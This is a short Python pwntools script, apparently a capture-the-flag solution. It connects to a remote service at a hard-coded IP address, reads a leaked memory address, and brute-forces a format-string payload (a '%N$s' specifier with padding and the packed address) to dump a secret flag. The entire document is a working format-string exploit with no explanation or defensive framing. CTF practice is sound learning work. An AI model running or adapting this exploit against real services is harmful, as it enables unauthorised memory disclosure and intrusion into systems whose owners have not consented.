from pwn import *

for i in range(32):
    for j in range(32):
        try:
            io = remote("13.124.117.173", 10314)

            io.recvuntil(b"Debug: ")
            flag_address = int(io.recvline().strip(), 16)
            log.info(f"Flag address: {hex(flag_address)}")

            payload = b"%"+str(j).encode()+b"$s"
            payload += b"A" * i
            payload += p64(flag_address)

            io.sendlineafter(b"Feedback:", payload)

            flag = io.recvline().strip()
            log.success(f"Flag: {flag}")

            io.close()
        except:
            continue
